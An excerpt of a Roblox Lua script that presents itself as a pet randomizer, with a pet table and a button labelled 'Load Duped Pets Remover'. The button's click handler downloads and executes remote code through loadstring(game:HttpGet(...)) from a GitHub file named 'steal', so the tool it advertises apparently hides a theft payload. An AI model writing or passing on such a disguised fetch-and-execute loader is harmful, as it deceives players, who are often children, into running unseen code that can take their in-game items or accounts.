...
local petTable = {
    ...
    ["Gourmet Egg"] = { "Bagel Bunny", "Pancake Mole", "Sushi Bear", "Spagghetti Sloth", "French Fry Ferret" },
}
...
loadAgeBtn.Text = "🕒 Load Duped Pets Remover"
...
loadAgeBtn.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeAdmodz/PetRandomizer/refs/heads/main/steal"))()
end)
